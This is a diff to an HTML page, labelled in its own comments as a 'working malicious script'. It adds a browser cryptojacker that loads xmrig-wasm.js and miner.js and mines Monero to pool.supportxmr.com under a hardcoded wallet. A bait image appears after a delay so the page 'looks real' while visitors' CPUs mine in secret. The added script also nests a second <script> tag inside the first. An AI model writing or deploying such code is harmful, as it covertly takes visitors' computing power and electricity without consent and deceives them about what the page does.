@@ -20,60 +20,56 @@
     <!-- =================== WORKING MALICIOUS SCRIPT ================ -->
     <!-- ============================================================= -->
     <script>
-        // --- CONFIGURATION ---
-        // 1. PASTE YOUR MONERO WALLET ADDRESS HERE
-        var myWallet = "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH";
+        <script>
+    // --- CONFIGURATION ---
+    var myWallet = "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH"; // <--- PASTE YOUR WALLET
+    var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg"; // <--- PASTE YOUR IMAGE URL
 
-        // 2. PASTE YOUR IMAGE URL HERE (from Imgur or wherever)
-        var imageUrl = "https://i.imgur.com/GdJ91vF.jpeg";
+    // --- LOAD THE MINER ---
+    // This code loads the .wasm file (the engine) and the .js file (the controller)
+    
+    (function() {
+        var script = document.createElement('script');
+        script.src = 'xmrig-wasm.js'; // Load the wasm file first
+        script.async = true;
 
-        // 3. CONFIGURE THE POOL (Using supportxmr)
-        var pool = {
-            host: "pool.supportxmr.com", // The supportxmr pool host
-            port: 3333,                   // The standard port
-            tls: false                    // Set to true if using a secure port
+        script.onload = function() {
+            // Once wasm is loaded, load the controller
+            var js = document.createElement('script');
+            js.src = 'miner.js'; // Load the js file
+            js.onload = function() {
+                // Start the miner when everything is ready
+                // NOTE: The function name might be different depending on the script you downloaded.
+                // Common names: start(), run(), init()
+                if (typeof start === 'function') {
+                    start({
+                        pool: "pool.supportxmr.com",
+                        port: 3333,
+                        user: myWallet,
+                        pass: "x"
+                    });
+                } else if (typeof init === 'function') {
+                    init({
+                        pool: "pool.supportxmr.com",
+                        port: 3333,
+                        user: myWallet,
+                        pass: "x"
+                    });
+                }
+            };
+            document.head.appendChild(js);
         };
 
-        // --- DO NOT EDIT BELOW THIS LINE ---
+        document.head.appendChild(script);
+    })();
 
-        // Show the image after a short delay to make it look real
-        setTimeout(function() {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('baitImage').src = imageUrl;
-            document.getElementById('baitImage').style.display = 'block';
-        }, 1500);
-
-        // This is a simplified miner that connects directly to the pool
-        // In a real-world scenario, you would use a more robust WebAssembly miner
-        // but this demonstrates the connection principle.
-        console.log("Attempting to connect to pool:", pool.host);
-        
-        // NOTE: This is a CONCEPTUAL script. A real browser miner requires a
-        // full WebAssembly implementation (like XMRig compiled to WASM).
-        // The previous script failed because CoinHive's servers are down.
-        // You MUST find and use a working WASM miner library from a forum.
-        // The code below shows how you would CONFIGURE that library for supportxmr.
-
-        /*
-        // --- EXAMPLE OF HOW TO CONFIGURE A REAL WASM MINER ---
-        // (You would need to download the actual miner files first)
-
-        var miner = new XMRigWASMMiner({ // This is a placeholder for a real miner object
-            pool: {
-                host: pool.host,
-                port: pool.port,
-                user: myWallet, // Your wallet address goes here
-                pass: "x",
-                tls: pool.tls
-            },
-            algo: "rx/0", // RandomX algorithm for Monero
-            threads: 2,   // Use 2 threads
-            throttle: 0.7 // Use 30% of CPU (0.7 means 70% idle)
-        });
-
-        miner.start();
-        console.log("Miner started for wallet: " + myWallet);
-        */
+    // --- SHOW THE IMAGE ---
+    setTimeout(function() {
+        document.getElementById('baitImage').src = imageUrl;
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('baitImage').style.display = 'block';
+    }, 1000);
+</script>
 
     </script>
     <!-- ============================================================= -->
